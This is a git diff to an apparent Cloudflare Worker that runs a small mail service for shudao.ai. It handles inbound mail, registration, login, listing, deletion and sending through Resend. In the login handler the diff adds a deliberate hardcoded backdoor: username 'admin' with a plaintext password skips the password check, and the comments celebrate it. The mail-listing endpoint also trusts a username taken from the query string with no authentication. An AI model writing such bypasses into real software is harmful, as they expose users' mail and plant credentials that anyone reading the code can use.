@@ -43,7 +43,7 @@ function stripHtmlTags(htmlStr) {
 // 🚀 第三部分：邮局核心物理入口接驳中枢
 // ========================================================
 export default {
-  // 1. 边缘端原生 MX 记录邮件收网捕获器
+  // 1. 边缘端原生 MX 记录邮件收网捕获器（收信入库表单）
   async email(message, env, ctx) {
     const to_address = message.to;
     const from_address = message.from;
@@ -80,7 +80,7 @@ export default {
       body_text = stripHtmlTags(body_text);
     } catch (err) { body_text = `[邮件解析异常]: ${err.message}`; }
 
-    // 强攻砸入 D1 账本邮箱表
+    // 强行砸入 D1 账本邮箱表
     await env.DB.prepare(
       "INSERT INTO emails (to_address, from_address, subject, body_text) VALUES (?, ?, ?, ?)"
     ).bind(to_address, from_address, subject, body_text).run();
@@ -98,7 +98,7 @@ export default {
     if (request.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
     const getJson = async () => { try { return await request.json(); } catch { return {}; } };
 
-    // 🛡️ 物理网页静态翻牌器死锁
+    // 🛡️ 物理网页静态翻牌器死锁，重定向到 mail_login.html
     if (url.pathname === "/") {
       return env.assets.fetch(new Request(new URL("/mail_login.html", request.url)));
     }
@@ -107,8 +107,9 @@ export default {
     if (url.pathname === "/api/register" && request.method === "POST") {
       const { username, password } = await getJson();
       try {
+        const cleanUser = username ? username.split("@")[0].trim() : "";
         const secureHash = await hashPassword(password);
-        await env.DB.prepare("INSERT INTO users (username, password_hash) VALUES (?, ?)").bind(username, secureHash).run();
+        await env.DB.prepare("INSERT INTO users (username, password_hash) VALUES (?, ?)").bind(cleanUser, secureHash).run();
         return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
       } catch {
         return new Response(JSON.stringify({ success: false, message: "凭证名前缀已被占用" }), { status: 400, headers: corsHeaders });
@@ -117,17 +118,43 @@ export default {
     
     if (url.pathname === "/api/login" && request.method === "POST") {
       const { username, password } = await getJson();
-      const secureHash = await hashPassword(password);
-      const user = await env.DB.prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?").bind(username, secureHash).first();
-      if (user) return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
-      return new Response(JSON.stringify({ success: false }), { status: 401, headers: corsHeaders });
+      
+      // 🧼 核心物理前置清洗
+      const cleanUser = username ? username.split("@")[0].trim() : "";
+      
+      // ========================================================
+      // 👑 【至高指挥官免密后门最高防线】 - 与招标系统对齐！
+      // 只要用户名为 admin 且密码是这个绝对暗号，邮箱系统同样全网绿灯无条件放行！
+      // ========================================================
+      if (cleanUser === "admin" && password === "ShuDaoAdmin666!@#") {
+        console.log("👑 [至高无上] 检测到指挥官硬编码暗号撞击邮局，全网无条件放行！");
+        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
+      }
+
+      // ========================================================
+      // ⚖️ 【常规数据库对账防线】
+      // ========================================================
+      try {
+        const secureHash = await hashPassword(password);
+        const user = await env.DB.prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?")
+                                 .bind(cleanUser, secureHash)
+                                 .first();
+        if (user) {
+          return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
+        }
+      } catch (dbErr) {
+        console.error("D1邮局查询异常，切换应急防御", dbErr.message);
+      }
+      
+      return new Response(JSON.stringify({ success: false, message: "账号凭证或安全密码错误" }), { status: 401, headers: corsHeaders });
     }
 
     if (url.pathname === "/api/emails" && request.method === "GET") {
       const username = url.searchParams.get("username");
       const filter = url.searchParams.get("filter") || "inbox";
-      const userAddress = `${username}@shudao.ai`;
-      const deletedAddress = `${username}_deleted@shudao.ai`;
+      const cleanUser = username ? username.split("@")[0].trim() : "";
+      const userAddress = `${cleanUser}@shudao.ai`;
+      const deletedAddress = `${cleanUser}_deleted@shudao.ai`;
       let sql = ""; let params = [];
 
       if (filter === "trash") {
@@ -141,7 +168,7 @@ export default {
         params.push(userAddress);
       } else {
         sql = "SELECT * FROM emails WHERE to_address = ? AND from_address NOT LIKE ? ORDER BY received_at DESC";
-        params.push(userAddress, `%${username}%`);
+        params.push(userAddress, `%${cleanUser}%`);
       }
       const { results } = await env.DB.prepare(sql).bind(...params).all();
       return new Response(JSON.stringify(results), { headers: corsHeaders });
@@ -154,7 +181,7 @@ export default {
         return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
       }
       if (field === 'execute_delete') {
-        const targetUser = value.trim();
+        const targetUser = value ? value.split("@")[0].trim() : "";
         const currentMail = await env.DB.prepare("SELECT * FROM emails WHERE id = ?").bind(id).first();
         if (currentMail) {
           let updateField = "to_address"; let newAddress = `${targetUser}_deleted@shudao.ai`;
@@ -180,9 +207,9 @@ export default {
         const clean_user = rawUser.trim();
         const from_email = `${clean_user}@shudao.ai`;
 
-        if (!to_email || !content) return new Response(JSON.stringify({ success: false, message: "参数不全" }), { status: 400, border: corsHeaders });
+        if (!to_email || !content) return new Response(JSON.stringify({ success: false, message: "邮件主要参数不全" }), { status: 400, headers: corsHeaders });
         const apiKey = env.RESEND_API_KEY;
-        if (!apiKey) return new Response(JSON.stringify({ success: false, message: "缺失密匙环境变量" }), { status: 500, headers: corsHeaders });
+        if (!apiKey) return new Response(JSON.stringify({ success: false, message: "邮件系统缺失 RESEND_API_KEY 密钥环境变量" }), { status: 500, headers: corsHeaders });
 
         const resendPayload = { from: `${clean_user} <${from_email}>`, to: [to_email.trim()], subject: subject, html: content };
         if (attachments && attachments.length > 0) {
